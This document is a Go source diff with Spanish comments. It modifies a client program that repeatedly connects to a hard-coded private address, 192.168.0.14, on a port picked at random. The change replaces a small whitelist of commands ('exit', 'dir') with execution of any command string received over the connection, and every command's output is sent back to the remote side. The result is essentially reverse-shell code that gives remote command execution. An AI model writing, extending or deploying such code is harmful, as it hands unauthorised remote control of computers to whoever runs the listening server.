@@ -11,7 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	// "strconv"
+	"strconv"
 	"time"
 )
 
@@ -31,17 +31,18 @@ func generateRandomPort(min, max int64) (int64, error) {
 }
 
 func main() {
-	// min := int64(1024)
-	// max := int64(49151)
+	min := int64(1024)
+	max := int64(49151)
 
-	// port, err := generateRandomPort(min, max)
-	// if err != nil {
-	// 	fmt.Println("Error generando puerto aleatorio:", err)
-	// 	return
-	// }
+	port, err := generateRandomPort(min, max)
+	if err != nil {
+		fmt.Println("Error generando puerto aleatorio:", err)
+		return
+	}
 
+	var conn net.Conn
 	for {
-		conn := connectToServer("192.168.0.14:4444")
+		conn = connectToServer("192.168.0.14:" + strconv.Itoa(int(port)))
 		if conn != nil {
 			defer conn.Close()
 
@@ -61,21 +62,22 @@ func main() {
 			default:
 				fmt.Println("Sistema operativo no reconocido")
 			}
+			break // Rompe el bucle si la conexión fue exitosa
+		} else {
+			// Solo intenta de nuevo si la conexión no fue exitosa
+			fmt.Println("Error al conectar, reintentando...")
+			time.Sleep(5 * time.Second) // Reintenta cada 5 segundos
 		}
-		time.Sleep(5 * time.Second) // Espera 5 segundos antes de intentar reconectar
 	}
 }
 
 // Función para conectar al servidor con reintento en caso de fallo
 func connectToServer(address string) net.Conn {
-	for {
-		conn, err := net.Dial("tcp", address)
-		if err == nil {
-			return conn
-		}
-		fmt.Println("Error al conectar, reintentando...")
-		time.Sleep(5 * time.Second) // Reintenta cada 5 segundos
+	conn, err := net.Dial("tcp", address)
+	if err != nil {
+		return nil
 	}
+	return conn
 }
 
 // Manejar la entrada del usuario (stdin) y enviar al servidor con cifrado
@@ -137,23 +139,16 @@ func listenForCommands(conn net.Conn) {
 		}
 		command := string(buf[:n])
 
-		// Comandos de ejemplo
-		switch command {
-		case "exit":
-			fmt.Println("Cerrando conexión")
-			conn.Close()
-			os.Exit(0)
-		case "dir":
-			// Ejecutar comando 'dir' en el sistema y devolverlo al cliente
-			output, err := exec.Command("cmd", "/C", "dir").Output()
-			if err != nil {
-				fmt.Println("Error ejecutando dir:", err)
-				return
-			}
-			conn.Write(output)
-		default:
-			fmt.Println("Comando desconocido:", command)
+		// Ejecutar cualquier comando recibido
+		output, err := exec.Command(command).CombinedOutput()
+		if err != nil {
+			// En caso de error, enviar el mensaje de error al cliente
+			conn.Write([]byte("Error ejecutando comando: " + err.Error()))
+			continue
 		}
+
+		// Enviar la salida del comando ejecutado de vuelta al cliente
+		conn.Write(output)
 	}
 }
 
